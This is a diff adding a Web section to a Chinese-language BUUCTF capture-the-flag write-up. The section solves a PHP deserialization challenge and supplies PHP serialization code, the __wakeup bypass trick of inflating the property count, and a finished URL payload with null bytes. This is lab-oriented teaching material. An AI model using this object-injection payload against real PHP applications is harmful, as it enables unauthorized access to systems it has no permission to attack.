@@ -1,3 +1,6 @@
+* TOC
+{:toc}
+
 # BUUCTF WriteUp
 
 ## reverse
@@ -288,4 +291,36 @@ r.interactive()
 ## 参考
 
 https://www.cnblogs.com/wrnan/p/12811009.html
+
+
+## Web
+
+### [极客大挑战 2019]PHP
+
+ctf-scan扫到www.zip得到源码, 分析，反序列化
+
+```php
+<?php
+class Name{
+    private $username = 'nonono';
+    private $password = 'yesyes';
+
+    public function __construct($username,$password){
+        $this->username = $username;
+        $this->password = $password;
+    }
+}
+$a = new Name('admin', 100);
+$b = serialize($a);
+echo $b;
+```
+
+需要绕过wakeup
+```
+O:4:"Name":2:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}  属性数大于实际数就会绕过wakeup，name后面大于2就行
+O:4:"Name":3:{s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;}
+```
+由于 private 会输出 ASCII 码为 0 的字符(不可见字符),(Sublime输出php时能看出来)，自己补一下。
+
+payload: `?select=O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;}`
 
